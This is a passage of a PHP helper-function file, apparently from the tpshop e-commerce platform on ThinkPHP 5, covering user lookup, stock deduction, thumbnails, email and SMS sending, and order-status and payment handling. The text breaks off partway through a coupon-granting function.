<?php
/**
 * tpshop
 * ============================================================================

 * 技术交流QQ3327926505
 * ----------------------------------------------------------------------------

 * 采用最新Thinkphp5助手函数特性实现单字母函数M D U等简写方式
 * ============================================================================
 * $Author: 二月鸟飞 2019-03-1 $
 */
use think\Db;

/**
 * 获取用户信息
 * @param $user_value  用户id 邮箱 手机 第三方id
 * @param int $type 类型 0 user_id查找 1 邮箱查找 2 手机查找 3 第三方唯一标识查找
 * @param string $oauth 第三方来源
 * @return mixed
 */
function get_user_info($user_value, $type = 0, $oauth = '')
{
    $map = [];
    if ($type == 0) {
        $map['user_id'] = $user_value;
    } elseif ($type == 1) {
        $map['email'] = $user_value;
    } elseif ($type == 2) {
        $map['mobile'] = $user_value;
    } elseif ($type == 3) {
        $thirdUser = Db::name('oauth_users')->where(['openid' => $user_value, 'oauth' => $oauth])->find();
        $map['user_id'] = $thirdUser['user_id'];
    } elseif ($type == 4) {
        $thirdUser = Db::name('oauth_users')->where(['unionid' => $user_value])->find();
        $map['user_id'] = $thirdUser['user_id'];
    }

    return Db::name('users')->where($map)->find();
}

/**
 * 更新会员等级,折扣，消费总额
 * @param $user_id  用户ID
 * @return boolean
 */
function update_user_level($user_id)
{
    $level_info = M('user_level')->order('level_id')->select();
    $total_amount = M('order')->master()->where(['user_id' => $user_id,'pay_status'=>1,'order_status'=>['in','2,4']])->sum('order_amount+user_money');
    if ($level_info) {
        foreach ($level_info as $k => $v) {
            if ($total_amount >= $v['amount']) {
                $level = $level_info[$k]['level_id'];
            }
        }
        $user = session('user');
        //累计额度达到新等级，更新会员折扣
        if (isset($level) && $level > $user['level']) {
            $updata['level'] = $level;
        }

    }
    $updata['total_amount'] = $total_amount;//更新累计修复额度
    M('users')->where("user_id", $user_id)->save($updata);
}

/**
 *  商品缩略图 给于标签调用 拿出商品表的 original_img 原始图来裁切出来的
 * @param type $goods_id 商品id
 * @param type $width 生成缩略图的宽度
 * @param type $height 生成缩略图的高度
 */
function goods_thum_images($goods_id, $width, $height)
{
    if (empty($goods_id)) return '';
    
    //判断缩略图是否存在
    $path = UPLOAD_PATH."goods/thumb/$goods_id/";
    $goods_thumb_name = "goods_thumb_{$goods_id}_{$width}_{$height}";

    // 这个商品 已经生成过这个比例的图片就直接返回了
    if (is_file($path . $goods_thumb_name . '.jpg')) return '/' . $path . $goods_thumb_name . '.jpg';
    if (is_file($path . $goods_thumb_name . '.jpeg')) return '/' . $path . $goods_thumb_name . '.jpeg';
    if (is_file($path . $goods_thumb_name . '.gif')) return '/' . $path . $goods_thumb_name . '.gif';
    if (is_file($path . $goods_thumb_name . '.png')) return '/' . $path . $goods_thumb_name . '.png';

    $original_img = Db::name('goods')->where("goods_id", $goods_id)->cache(true, 30, 'original_img_cache')->value('original_img');
    if (empty($original_img)) {
        return '/public/images/icon_goods_thumb_empty_300.png';
    }
    
    if(tpCache('oss.oss_switch')){
        $ossClient = new \app\common\logic\OssLogic;
        if (($ossUrl = $ossClient->getGoodsThumbImageUrl($original_img, $width, $height))) {
            return $ossUrl;
        }    
    }
    

    $original_img = '.' . $original_img; // 相对路径
    if (!is_file($original_img)) {
        return '/public/images/icon_goods_thumb_empty_300.png';
    }

    try {
        require_once 'vendor/topthink/think-image/src/Image.php';
        require_once 'vendor/topthink/think-image/src/image/Exception.php';
		if(strstr(strtolower($original_img),'.gif'))
		{
            require_once 'vendor/topthink/think-image/src/image/gif/Encoder.php';
            require_once 'vendor/topthink/think-image/src/image/gif/Decoder.php';
            require_once 'vendor/topthink/think-image/src/image/gif/Gif.php';
		}
        $image = \think\Image::open($original_img);

        $goods_thumb_name = $goods_thumb_name . '.' . $image->type();
        // 生成缩略图
        !is_dir($path) && mkdir($path, 0777, true);
        // 参考文章 http://www.mb5u.com/biancheng/php/php_84533.html  改动参考 http://www.thinkphp.cn/topic/13542.html
        $image->thumb($width, $height, 2)->save($path . $goods_thumb_name, NULL, 100); //按照原图的比例生成一个最大为$width*$height的缩略图并保存
        $img_url = '/' . $path . $goods_thumb_name;

        return $img_url;
    } catch (think\Exception $e) {

        return $original_img;
    }
}

/**
 * 商品相册缩略图
 */
function get_sub_images($sub_img, $goods_id, $width, $height)
{
    //判断缩略图是否存在
    $path = UPLOAD_PATH."goods/thumb/$goods_id/";
    $goods_thumb_name = "goods_sub_thumb_{$sub_img['img_id']}_{$width}_{$height}";
    
    //这个缩略图 已经生成过这个比例的图片就直接返回了
    if (is_file($path . $goods_thumb_name . '.jpg')) return '/' . $path . $goods_thumb_name . '.jpg';
    if (is_file($path . $goods_thumb_name . '.jpeg')) return '/' . $path . $goods_thumb_name . '.jpeg';
    if (is_file($path . $goods_thumb_name . '.gif')) return '/' . $path . $goods_thumb_name . '.gif';
    if (is_file($path . $goods_thumb_name . '.png')) return '/' . $path . $goods_thumb_name . '.png';

    $ossClient = new \app\common\logic\OssLogic;
    if (($ossUrl = $ossClient->getGoodsAlbumThumbUrl($sub_img['image_url'], $width, $height))) {
        return $ossUrl;
    }

    $original_img = '.' . $sub_img['image_url']; //相对路径
    if (!is_file($original_img)) {
        return '/public/images/icon_goods_thumb_empty_300.png';
    }
    try {
        require_once 'vendor/topthink/think-image/src/Image.php';
        require_once 'vendor/topthink/think-image/src/image/Exception.php';
        if(strstr(strtolower($original_img),'.gif'))
        {
            require_once 'vendor/topthink/think-image/src/image/gif/Encoder.php';
            require_once 'vendor/topthink/think-image/src/image/gif/Decoder.php';
            require_once 'vendor/topthink/think-image/src/image/gif/Gif.php';
        }
        $image = \think\Image::open($original_img);

        $goods_thumb_name = $goods_thumb_name . '.' . $image->type();
        // 生成缩略图
        !is_dir($path) && mkdir($path, 0777, true);
        // 参考文章 http://www.mb5u.com/biancheng/php/php_84533.html  改动参考 http://www.thinkphp.cn/topic/13542.html
        $image->thumb($width, $height, 2)->save($path . $goods_thumb_name, NULL, 100); //按照原图的比例生成一个最大为$width*$height的缩略图并保存
        return '/' . $path . $goods_thumb_name;
    } catch (think\Exception $e) {

        return $original_img;
    }
}

/**
 * 刷新商品库存, 如果商品有设置规格库存, 则商品总库存 等于 所有规格库存相加
 * @param type $goods_id 商品id
 */
function refresh_stock($goods_id)
{
    $count = M("SpecGoodsPrice")->where("goods_id", $goods_id)->count();
    if ($count == 0) return false; // 没有使用规格方式 没必要更改总库存

    $store_count = M("SpecGoodsPrice")->where("goods_id", $goods_id)->sum('store_count');
    M("Goods")->where("goods_id", $goods_id)->save(array('store_count' => $store_count)); // 更新商品的总库存
}

/**
 * 根据 order_goods 表扣除商品库存
 * @param $order|订单对象或者数组
 * @throws \think\Exception
 */
function minus_stock($order)
{
    $orderGoodsArr = M('OrderGoods')->master()->where(array('order_id' => $order['order_id']))->select(); // 有可能是刚下完订单的 需要到主库里面去查
    foreach ($orderGoodsArr as $key => $val) {
        // 有选择规格的商品
        if (!empty($val['spec_key'])) {   // 先到规格表里面扣除数量 再重新刷新一个 这件商品的总数量
            $SpecGoodsPrice = new \app\common\model\SpecGoodsPrice();
            $specGoodsPrice = $SpecGoodsPrice::get(['goods_id' => $val['goods_id'], 'key' => $val['spec_key']]);
            $specGoodsPrice->where(['goods_id' => $val['goods_id'], 'key' => $val['spec_key']])->setDec('store_count', $val['goods_num']);
            refresh_stock($val['goods_id']);
        } else {
            $specGoodsPrice = null;
            M('Goods')->where("goods_id", $val['goods_id'])->setDec('store_count', $val['goods_num']); // 直接扣除商品总数量
        }
        update_stock_log($order['user_id'], -$val['goods_num'], $val, $order['order_sn']);//库存出库日志
        M('Goods')->where("goods_id", $val['goods_id'])->setInc('sales_sum', $val['goods_num']); // 增加商品销售量
        //更新活动商品购买量
        if ($val['prom_type'] == 1 || $val['prom_type'] == 2) {
            $GoodsPromFactory = new \app\common\logic\GoodsPromFactory();
            $goodsPromLogic = $GoodsPromFactory->makeModule($val, $specGoodsPrice);
            $prom = $goodsPromLogic->getPromModel();
            if ($prom['status'] == 1 && $prom['is_end'] == 0) {
                $tb = $val['prom_type'] == 1 ? 'flash_sale' : 'group_buy';
                M($tb)->where("id", $val['prom_id'])->setInc('buy_num', $val['goods_num']);
                M($tb)->where("id", $val['prom_id'])->setInc('order_num');
            }
        }
        //更新拼团商品购买量
        if($val['prom_type'] == 6){
            Db::name('team_activity')->where('team_id',  $val['prom_id'])->setInc('sales_sum', $val['goods_num']);
        }
    }
}

/**
 * 商品库存操作日志
 * @param int $muid 操作 用户ID
 * @param int $stock 更改库存数
 * @param array $goods 库存商品
 * @param string $order_sn 订单编号
 */
function update_stock_log($muid, $stock = 1, $goods, $order_sn = '')
{
    $data['ctime'] = time();
    $data['stock'] = $stock;
    $data['muid'] = $muid;
    $data['goods_id'] = $goods['goods_id'];
    $data['goods_name'] = $goods['goods_name'];
    $data['goods_spec'] = empty($goods['key_name']) ?  $goods['spec_key_name'] : $goods['key_name'];
    $data['store_id'] = $goods['store_id'];
    $data['order_sn'] = $order_sn;
    M('stock_log')->add($data);
}

/**
 * 邮件发送
 * @param $to    接收人
 * @param string $subject 邮件标题
 * @param string $content 邮件内容(html模板渲染后的内容)
 * @throws Exception
 * @throws phpmailerException
 */
function send_email($to, $subject = '', $content = '')
{
    vendor('phpmailer.PHPMailerAutoload');
    //判断openssl是否开启
    $openssl_funcs = get_extension_funcs('openssl');
    if(!$openssl_funcs){
        return array('status'=>-1 , 'msg'=>'请先开启openssl扩展');
    }
    $mail = new PHPMailer;
    $config = tpCache('smtp');
    $mail->CharSet = 'UTF-8'; //设定邮件编码，默认ISO-8859-1，如果发中文此项必须设置，否则乱码
    $mail->isSMTP();
    //Enable SMTP debugging
    // 0 = off (for production use)
    // 1 = client messages
    // 2 = client and server messages
    $mail->SMTPDebug = 0;
    //调试输出格式
    //$mail->Debugoutput = 'html';
    //smtp服务器
    $mail->Host = $config['smtp_server'];
    //端口 - likely to be 25, 465 or 587
    $mail->Port = $config['smtp_port'];
    if ($mail->Port == 465) $mail->SMTPSecure = 'ssl';// 使用安全协议
    //Whether to use SMTP authentication
    $mail->SMTPAuth = true;
    //用户名
    $mail->Username = $config['smtp_user'];
    //密码
    $mail->Password = $config['smtp_pwd'];
    //Set who the message is to be sent from
    $mail->setFrom($config['smtp_user']);
    //回复地址
    //$mail->addReplyTo('replyto@example.com', 'First Last');
    //接收邮件方
    if (is_array($to)) {
        foreach ($to as $v) {
            $mail->addAddress($v);
        }
    } else {
        $mail->addAddress($to);
    }

    $mail->isHTML(true);// send as HTML
    //标题
    $mail->Subject = $subject;
    //HTML内容转换
    $mail->msgHTML($content);
    //Replace the plain text body with one created manually
    //$mail->AltBody = 'This is a plain-text message body';
    //添加附件
    //$mail->addAttachment('images/phpmailer_mini.png');
    //send the message, check for errors
    if (!$mail->send()) {
         return array('status'=>-1 , 'msg'=>'发送失败: '.$mail->ErrorInfo);
    } else {
        return array('status'=>1 , 'msg'=>'发送成功');
    }
}


/**
 * 检测是否能够发送短信
 * @param unknown $scene
 * @return multitype:number string
 */
function checkEnableSendSms($scene)
{

    $scenes = C('SEND_SCENE');
    $sceneItem = $scenes[$scene];
    if (!$sceneItem) {
        return array("status" => -1, "msg" => "场景参数'scene'错误!");
    }
    $key = $sceneItem[2];
    $sceneName = $sceneItem[0];
    $config = tpCache('sms');
    $smsEnable = $config[$key];

    if (!$smsEnable) {
        return array("status" => -1, "msg" => "['$sceneName']发送短信被关闭'");
    }
    //判断是否添加"注册模板"
    $size = M('sms_template')->where("send_scene", $scene)->count('tpl_id');
    if (!$size) {
        return array("status" => -1, "msg" => "请先添加['$sceneName']短信模板");
    }
    return array("status" => 1, "msg" => "可以发送短信");

}

/**
 * 发送短信逻辑
 * @param unknown $scene
 */
function sendSms($scene, $sender, $params,$unique_id=0)
{
    $smsLogic = new \app\common\logic\SmsLogic;
    return $smsLogic->sendSms($scene, $sender, $params, $unique_id);
}

/**
 * 查询快递
 * @param $shipping_code|快递公司编码
 * @param $invoice_no|快递单号
 * @return array  物流跟踪信息数组
 */
function queryExpressInfo($shipping_code, $invoice_no)
{
//    $url = "https://m.kuaidi100.com/query?type=" . $shipping_code . "&postid=" . $invoice_no . "&id=1&valicode=&temp=0.49738534969422676";
    $url = "http://www.kuaidi100.com/query?type=" . $shipping_code . "&postid=" . $invoice_no . "&id=19&valicode=&temp=0.3141174374951695";
    $resp = httpRequest($url, "GET");
    return json_decode($resp, true);
}

/**
 * 获取某个商品分类的 儿子 孙子  重子重孙 的 id
 * @param $cat_id
 * @return array
 */
function getCatGrandson($cat_id)
{
    $GLOBALS['catGrandson'] = array();
    $GLOBALS['category_id_arr'] = array();
    // 先把自己的id 保存起来
    $GLOBALS['catGrandson'][] = $cat_id;
    // 把整张表找出来
    $GLOBALS['category_id_arr'] = M('GoodsCategory')->cache(true, TPSHOP_CACHE_TIME)->getField('id,parent_id');
    // 先把所有儿子找出来
    $son_id_arr = M('GoodsCategory')->where("parent_id", $cat_id)->cache(true, TPSHOP_CACHE_TIME)->getField('id', true);
    foreach ($son_id_arr as $k => $v) {
        getCatGrandson2($v);
    }
    return $GLOBALS['catGrandson'];
}

/**
 * 获取某个文章分类的 儿子 孙子  重子重孙 的 id
 * @param type $cat_id
 */
function getArticleCatGrandson($cat_id)
{
    $GLOBALS['ArticleCatGrandson'] = array();
    $GLOBALS['cat_id_arr'] = array();
    // 先把自己的id 保存起来
    $GLOBALS['ArticleCatGrandson'][] = $cat_id;
    // 把整张表找出来
    $GLOBALS['cat_id_arr'] = M('ArticleCat')->getField('cat_id,parent_id');
    // 先把所有儿子找出来
    $son_id_arr = M('ArticleCat')->where("parent_id", $cat_id)->getField('cat_id', true);
    foreach ($son_id_arr as $k => $v) {
        getArticleCatGrandson2($v);
    }
    return $GLOBALS['ArticleCatGrandson'];
}

/**
 * 递归调用找到 重子重孙
 * @param type $cat_id
 */
function getCatGrandson2($cat_id)
{
    $GLOBALS['catGrandson'][] = $cat_id;
    foreach ($GLOBALS['category_id_arr'] as $k => $v) {
        // 找到孙子
        if ($v == $cat_id) {
            getCatGrandson2($k); // 继续找孙子
        }
    }
}


/**
 * 递归调用找到 重子重孙
 * @param type $cat_id
 */
function getArticleCatGrandson2($cat_id)
{
    $GLOBALS['ArticleCatGrandson'][] = $cat_id;
    foreach ($GLOBALS['cat_id_arr'] as $k => $v) {
        // 找到孙子
        if ($v == $cat_id) {
            getArticleCatGrandson2($k); // 继续找孙子
        }
    }
}

/**
 * 获取商品库存, 只有上架的商品才返回库存数量
 * @param $goods_id
 * @param $key
 * @return mixed
 */
function getGoodNum($goods_id, $key)
{
    if (!empty($key)){
        return M("SpecGoodsPrice")
                        ->alias("s")
                        ->join('_Goods_ g ','s.goods_id = g.goods_id','LEFT')
                        ->where(['g.goods_id' => $goods_id, 'key' => $key ,"is_on_sale"=>1])->getField('s.store_count');
    }else{
        return M("Goods")->cache(true,10)->where(array("goods_id"=>$goods_id , "is_on_sale"=>1))->getField('store_count');
    }
}

/**
 * 获取缓存或者更新缓存
 * @param string $config_key 缓存文件名称
 * @param array $data 缓存数据  array('k1'=>'v1','k2'=>'v3')
 * @return array or string or bool
 */
function tpCache($config_key, $data = array())
{
    $param = explode('.', $config_key);
    if (empty($data)) {
        //如$config_key=shop_info则获取网站信息数组
        //如$config_key=shop_info.logo则获取网站logo字符串
        $config = F($param[0], '', TEMP_PATH);//直接获取缓存文件
        if (empty($config)) {
            //缓存文件不存在就读取数据库
            $res = D('config')->where("inc_type", $param[0])->select();
            if ($res) {
                foreach ($res as $k => $val) {
                    $config[$val['name']] = $val['value'];
                }
                F($param[0], $config, TEMP_PATH);
            }
        }
        if (count($param) > 1) {
            return $config[$param[1]];
        } else {
            return $config;
        }
    } else {
        //更新缓存
        $result = D('config')->where("inc_type", $param[0])->select();
        if ($result) {
            foreach ($result as $val) {
                $temp[$val['name']] = $val['value'];
            }
            foreach ($data as $k => $v) {
                $newArr = array('name' => $k, 'value' => trim($v), 'inc_type' => $param[0]);
                if (!isset($temp[$k])) {
                    M('config')->add($newArr);//新key数据插入数据库
                } else {
                    if ($v != $temp[$k])
                        M('config')->where("name", $k)->save($newArr);//缓存key存在且值有变更新此项
                }
            }
            //更新后的数据库记录
            $newRes = D('config')->where("inc_type", $param[0])->select();
            foreach ($newRes as $rs) {
                $newData[$rs['name']] = $rs['value'];
            }
        } else {
            foreach ($data as $k => $v) {
                $newArr[] = array('name' => $k, 'value' => trim($v), 'inc_type' => $param[0]);
            }
            M('config')->insertAll($newArr);
            $newData = $data;
        }
        return F($param[0], $newData, TEMP_PATH);
    }
}

/**
 * 记录帐户变动
 * @param int $user_id 用户id
 * @param int $user_money 可用余额变动
 * @param int $pay_points 消费积分变动
 * @param string $desc 变动说明
 * @param int $distribut_money 分佣金额
 * @param int $order_id 订单id
 * @param string $order_sn 订单sn
 * @param $frozen_money 冻结资金
 * @return bool
 */
function accountLog($user_id, $user_money = 0, $pay_points = 0,$desc = '', $distribut_money = 0, $order_id = 0 ,$order_sn = '',$frozen_money=0)
{
    /* 插入帐户变动记录 */
    $account_log = array(
        'user_id' => $user_id,
        'user_money' => $user_money,
        'pay_points' => $pay_points,
        'change_time' => time(),
        'frozen_money' => $frozen_money,
        'desc' => $desc,
        'order_id' => $order_id,
        'order_sn' => $order_sn
    );
    /* 更新用户信息 */
//    $sql = "UPDATE __PREFIX__users SET user_money = user_money + $user_money," .
//        " pay_points = pay_points + $pay_points, distribut_money = distribut_money + $distribut_money WHERE user_id = $user_id";
    $update_data = array(
        'user_money' => ['exp', 'user_money+' . $user_money],
        'pay_points' => ['exp', 'pay_points+' . $pay_points],
        'distribut_money' => ['exp', 'distribut_money+' . $distribut_money],
    );
	if(($user_money+$pay_points+$distribut_money) == 0)
		return false;
    $update = Db::name('users')->where('user_id', $user_id)->update($update_data);
    if ($update) {
        M('account_log')->add($account_log);
        return true;
    } else {
        return false;
    }
}

/**
 * 记录商家的帐户变动
 * @param $store_id 店铺ID
 * @param int $store_money 可用资金
 * @param $pending_money 可用余额变动
 * @param string $desc 变动说明
 * @param int $order_id 订单id
 * @param string $order_sn 订单sn
 * @return bool
 */
function storeAccountLog($store_id, $store_money = 0, $pending_money, $desc = '', $order_id = 0,$order_sn = '')
{
    /* 插入帐户变动记录 */
    $account_log = array(
        'store_id' => $store_id,
        'store_money' => $store_money, // 可用资金
        'pending_money' => $pending_money, // 未结算资金
        'change_time' => time(),
        'desc' => $desc,
        'order_id' => $order_id,
        'order_sn' => $order_sn
    );
    /* 更新用户信息 */
//    $sql = "UPDATE __PREFIX__store SET store_money = store_money + $store_money," .
//        " pending_money = pending_money + $pending_money WHERE store_id = $store_id";
    $update_data = array(
        'store_money' => ['exp', 'store_money+' . $store_money],
        'pending_money' => ['exp', 'pending_money+' . $pending_money],
    );
    $update = Db::name('store')->where('store_id', $store_id)->update($update_data);
    if ($update) {
        M('account_log_store')->add($account_log);
        return true;
    } else {
        return false;
    }
}

/**
 * 订单操作日志
 * 参数示例
 * @param type $order_id 订单id
 * @param type $action_note 操作备注
 * @param type $status_desc 操作状态  提交订单, 付款成功, 取消, 等待收货, 完成
 * @param type $user_id 用户id 默认为管理员
 * @return boolean
 */
function logOrder($order_id, $action_note, $status_desc, $user_id = 0, $user_type = 0)
{
    $status_desc_arr = array('提交订单', '付款成功', '取消', '等待收货', '完成', '退货');
    // if(!in_array($status_desc, $status_desc_arr))
    // return false;

    $order = M('order')->master()->where("order_id", $order_id)->find();
    $action_info = array(
        'order_id' => $order_id,
        'action_user' => $user_id,
        'user_type' => $user_type,
        'order_status' => $order['order_status'],
        'shipping_status' => $order['shipping_status'],
        'pay_status' => $order['pay_status'],
        'action_note' => $action_note,
        'status_desc' => $status_desc, //''
        'log_time' => time(),
    );
    return M('order_action')->add($action_info);
}

/**
 * 获取订单状态的 中文描述名称
 * @param type $order_id 订单id
 * @param type $order 订单数组
 * @return string
 */
function orderStatusDesc($order_id = 0, $order = array())
{
    if (empty($order))
        $order = M('Order')->where("order_id", $order_id)->find();

    // 货到付款
    if ($order['pay_code'] == 'cod') {
        if (in_array($order['order_status'], array(0, 1)) && $order['shipping_status'] == 0)
            return 'WAITSEND'; //'待发货',
    } else // 非货到付款
    {
        if ($order['pay_status'] == 0 && $order['order_status'] == 0)
            return 'WAITPAY'; //'待支付',
        if ($order['pay_status'] == 1 && in_array($order['order_status'], array(0, 1)) && $order['shipping_status'] != 1)
            return 'WAITSEND'; //'待发货',
    }
    if (($order['shipping_status'] == 1) && ($order['order_status'] == 1))
        return 'WAITRECEIVE'; //'待收货',
    if ($order['order_status'] == 2){
        return 'WAITCCOMMENT'; //'待评价',
    }
    if ($order['order_status'] == 3)
        return 'CANCEL'; //'已取消',
    if ($order['order_status'] == 4)
        return 'FINISH'; //'已完成',
    return 'OTHER';
}

/**
 * 获取订单状态的 显示按钮
 * @param type $order_id 订单id
 * @param type $order 订单数组
 * @return array()
 */
function orderBtn($order_id = 0, $order = array())
{
    if (empty($order))
        $order = M('Order')->where("order_id", $order_id)->find();
    /**
     *  订单用户端显示按钮
     * 去支付     AND pay_status=0 AND order_status=0 AND pay_code ! ="cod"
     * 取消按钮  AND pay_status=0 AND shipping_status=0 AND order_status=0
     * 确认收货  AND shipping_status=1 AND order_status=0
     * 评价      AND order_status=1
     * 查看物流  if(!empty(物流单号))
     */
    $btn_arr = array(
        'pay_btn' => 0, // 去支付按钮
        'cancel_btn' => 0, // 取消按钮
        'receive_btn' => 0, // 确认收货
        'comment_btn' => 0, // 评价按钮
        'shipping_btn' => 0, // 查看物流
        'return_btn' => 0, // 退货按钮 (联系客服)
    );

    // 三个月(90天)内的订单才可以进行有操作按钮. 三个月(90天)以外的过了退货 换货期, 即便是保修也让他联系厂家, 不走线上
    if(time() - $order['add_time'] > (86400 * 90))
    {    
        return $btn_arr;
    }
//return $btn_arr;
    // 货到付款
    if ($order['pay_code'] == 'cod') {
        if (($order['order_status'] == 0 || $order['order_status'] == 1) && $order['shipping_status'] == 0) // 待发货
        {
            $btn_arr['cancel_btn'] = 1; // 取消按钮 (联系客服)
        }
        if ($order['shipping_status'] == 1 && $order['order_status'] == 1) //待收货
        {
            $btn_arr['receive_btn'] = 1;  // 确认收货
        }
    } else {   // 非货到付款
        if ($order['pay_status'] == 0 && $order['order_status'] == 0) // 待支付
        {
            $btn_arr['pay_btn'] = 1; // 去支付按钮
            $btn_arr['cancel_btn'] = 1; // 取消按钮
        }
        if ($order['pay_status'] == 1 && in_array($order['order_status'], array(0, 1)) && $order['shipping_status'] == 0) // 待发货
        {
            $btn_arr['return_btn'] = 1; // 退货按钮 (联系客服)
            $btn_arr['cancel_btn'] = 1; // 取消按钮
        }
        if ($order['pay_status'] == 1 && $order['order_status'] == 1 && $order['shipping_status'] == 1) //待收货
        {
            $btn_arr['receive_btn'] = 1;  // 确认收货
            $btn_arr['return_btn'] = 1; // 退货按钮 (联系客服)
        }
    }
    if ($order['order_status'] == 2) {
        if ($order['is_comment'] == 0) {
            $btn_arr['comment_btn'] = 1;  // 评价按钮
        }
        $btn_arr['return_btn'] = 1; // 退货按钮 (联系客服)
    }
    if ($order['shipping_status'] != 0 && in_array($order['order_status'], [1,2,4])) {
        $btn_arr['shipping_btn'] = 1; // 查看物流
    }
    if ($order['shipping_status'] == 2 && $order['order_status'] == 1) // 部分发货
    {
        $btn_arr['return_btn'] = 1; // 退货按钮 (联系客服)
    }
    
    if ($order['order_status'] == 1 && $order['shipping_status'] == 1) {
        $btn_arr['return_btn'] = 1; //确认订单也可以申请售后&物流状态必须为已发货(部分发货暂时不考虑)
    }

    return $btn_arr;
}

/**
 * 给订单数组添加属性  包括按钮显示属性 和 订单状态显示属性
 * @param type $order
 */
function set_btn_order_status($order)
{
    $order_status_arr = C('ORDER_STATUS_DESC');
    $order['order_status_code'] = $order_status_code = orderStatusDesc(0, $order); // 订单状态显示给用户看的
    $order['order_status_desc'] = $order_status_arr[$order_status_code];
    $orderBtnArr = orderBtn(0, $order);
    return array_merge($order, $orderBtnArr); // 订单该显示的按钮
}

/**
 * 支付完成修改订单
 * @param $order_sn 订单号
 * @param string $transaction_id 第三方支付交易流水号
 * @return bool|void
 */
function update_pay_status($order_sn, $transaction_id = '')
{
    $time=time();
    if (stripos($order_sn, 'recharge') !== false) {
        //用户在线充值
        $order = M('recharge')->where(['order_sn' => $order_sn, 'pay_status' => 0])->find();
        if (!$order) return false;// 看看有没已经处理过这笔订单  支付宝返回不重复处理操作
        M('recharge')->where("order_sn", $order_sn)->save(array('pay_status' => 1, 'pay_time' => $time,'transaction_id'=>$transaction_id));
        accountLog($order['user_id'], $order['account'], 0, '会员在线充值');
    } else {
        // 先查看一下 是不是 合并支付的主订单号
        $order_list = M('order')->where("master_order_sn", $order_sn)->select();
        if ($order_list) {
            foreach ($order_list as $key => $val)
                update_pay_status($val['order_sn'], $transaction_id);
            return;
        }
        // 找出对应的订单
        $Order = new \app\common\model\Order();
        $order = $Order->where(['order_sn'=>$order_sn])->where(function ($query) {$query->where('pay_status', 0)->whereor('pay_status', 2);})->find();// 看看有没已经处理过这笔订单  支付宝返回不重复处理操作
        if (empty($order)) return false; //如果这笔订单已经处理过了
        if ($order['prom_type'] == 6) {
            $team = new \app\common\logic\team\Team();
            $team->setTeamActivityById($order['prom_id']);
            $team->setOrder($order);
            $team->doOrderPayAfter();
        }
        if ($order['prom_type'] == 4) {
            $preSell = new \app\common\logic\PreSell();
            $preSell->setPreSellById($order['prom_id']);
            $preSell->setOrder($order);
            $preSell->doOrderPayAfter();
        }else{
            // 修改支付状态  已支付
            M('order')->where("order_sn", $order_sn)->save(array('pay_status' => 1, 'pay_time' => $time, 'transaction_id' => $transaction_id));
        }
        $order = $order->toArray();
        if(tpCache('shopping.reduce') == 2) {
            if ($order['prom_type'] == 6) {
            	// 减少对应商品的库存.注：拼团类型为抽奖团的，先不减库存
                $team = \app\common\model\team\TeamActivity::get($order['prom_id']);
                if ($team['team_type'] != 2) {
                    minus_stock($order);
                }
            } else {
                minus_stock($order);
            }
        }
        // 记录订单操作日志
        logOrder($order['order_id'], '订单付款成功', '付款成功', $order['user_id'], 2);
        //分销设置
        M('rebate_log')->where("order_id", $order['order_id'])->save(array('status' => 1));
        // 成为分销商条件
        //$distribut_condition = tpCache('distribut.condition');
        //if($distribut_condition == 1)  // 购买商品付款才可以成为分销商
        //M('users')->where("user_id = {$order['user_id']}")->save(array('is_distribut'=>1));

        if($order['prom_type'] == 5){
            $OrderLogic = new \app\common\logic\OrderLogic();
            $OrderLogic->make_virtual_code($order);
        }
        //用户支付, 发送短信给商家
        $res = checkEnableSendSms("4");
        if ($res && $res['status'] == 1) {
            $store = M('store')->where("store_id", $order['store_id'])->find();
            if (!empty($store['service_phone'])) {
                $sender = $store['service_phone'];
                $params = array('order_id' => $order['order_id']);
                sendSms("4", $sender, $params);
            }
        }
        $Invoice = new \app\admin\logic\InvoiceLogic();
        $Invoice->createInvoice($order);
        // 发送微信消息模板提醒
        $wechat = new \app\common\logic\WechatLogic;
        $wechat->sendTemplateMsgOnPaySuccess($order);
    }
}

/**
 * 订单确认收货
 * @param $id   订单id
 * @param int $user_id
 * @return array
 */
function confirm_order($id, $user_id = 0)
{
    $where['order_id'] = $id;
    if ($user_id) {
        $where['user_id'] = $user_id;
    }
    $order = M('order')->where($where)->find();

    if ($order['order_status'] != 1 || empty($order['pay_time']) || $order['pay_status'] != 1)
        return array('status' => -1, 'msg' => '该订单不能收货确认');

    $data['order_status'] = 2; // 已收货
    $data['pay_status'] = 1; // 已付款
    $data['confirm_time'] = time(); //  收货确认时间
    if ($order['pay_code'] == 'cod') {
        $data['pay_time'] = time();
    }
    $row = M('order')->where(array('order_id' => $id))->save($data);
    if (!$row)
        return array('status' => -3, 'msg' => '操作失败');
    if($order['prom_type'] != 5){
        order_give($order);//不是虚拟订单送东西
    }
    //给他升级, 根据order表查看消费记录 给他会员等级升级 修改他的折扣 和 总金额
    update_user_level($order['user_id']);
    //分销设置
    M('rebate_log')->where(['order_id' => $id, 'status' => ['lt', 4]])->save(array('status' => 2, 'confirm' => time()));

    //如果是虚拟订单
    if($order['prom_type']  == 5){
        Db::name('order_goods')->where(['order_id'=>$id])->save(['is_send'=>1]);
    }
    // 通知发货消息
    $message_logic = new \app\common\logic\MessageLogisticsLogic();
    $message_logic->sendEvaluate($order);

    return array('status' => 1, 'msg' => '操作成功');
}

/**
 * 下单赠送活动：优惠券，积分
 * @param $order|订单数组
 */
function order_give($order)
{
    //促销优惠订单商品
    $prom_order_goods = M('order_goods')->where(['order_id' => $order['order_id'], 'prom_type' => 3])->select();
    //获取用户会员等级
//    $user_level = Db::name('users')->where(['user_id' => $order['user_id']])->getField('level');
    $message_logic = new \app\common\logic\MessageNoticeLogic();
    if($prom_order_goods){
    	//查找购买商品送优惠券活动
    	foreach ($prom_order_goods as $val) {
    		$prom_goods = M('prom_goods')->where(['store_id' => $order['store_id'], 'type' => 3, 'id' => $val['prom_id']])->find();
    		if ($prom_goods) {
    			//查找优惠券模板
    			$goods_coupon = M('coupon')->where("id", $prom_goods['expression'])->find();
    			// 用户会员等级是否符合送优惠券活动
//    			if (array_key_exists($user_level, array_flip(explode(',', $prom_goods['group'])))) {  //多商家暂时无这个限制
    				//优惠券发放数量验证，0为无限制。发放数量-已领取数量>0
    				if ($goods_coupon['createnum'] == 0 ||
    				($goods_coupon['createnum'] > 0 && ($goods_coupon['createnum'] - $goods_coupon['send_num']) > 0)
    				) {
    					$data = array(
                            'cid' => $goods_coupon['id'],
                            'type' => $goods_coupon['type'],
                            'uid' => $order['user_id'],
                            'send_time' => time(),
                            'store_id'  => $goods_coupon['store_id'],
                            'get_order_id' => $order['order_id'],
                        );
    					M('coupon_list')->add($data);
    					// 优惠券领取数量加一
